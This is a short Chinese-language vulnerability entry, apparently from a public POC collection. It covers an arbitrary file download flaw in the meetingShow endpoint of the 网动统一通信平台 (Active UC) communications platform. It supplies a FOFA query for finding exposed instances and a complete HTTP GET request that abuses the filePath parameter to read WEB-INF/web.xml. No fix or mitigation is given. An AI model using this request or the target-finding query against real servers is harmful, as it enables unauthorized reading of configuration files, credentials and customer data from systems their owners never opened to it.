# 网动统一通信平台meetingShow存在任意文件读取漏洞

# 一、漏洞简介
 网动统一通信平台是一个涵盖了多种通信功能的综合平台，通常包括文字、语音、视频通讯等功能，并且可能提供了一系列的通讯工具和服务。这样的平台通常旨在提升用户的沟通效率和便利性，为用户提供一个统一的通信环境。网动统一通信平台meetingShow接口处存在任意文件下载漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。  

# 二、影响版本
+ 网动统一通信平台

# 三、资产测绘
+ fofa`title="网动统一通信平台(Active UC)"`
+ 特征


---

# 四、漏洞复现
```http
GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey50q344kqgz0zoh>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
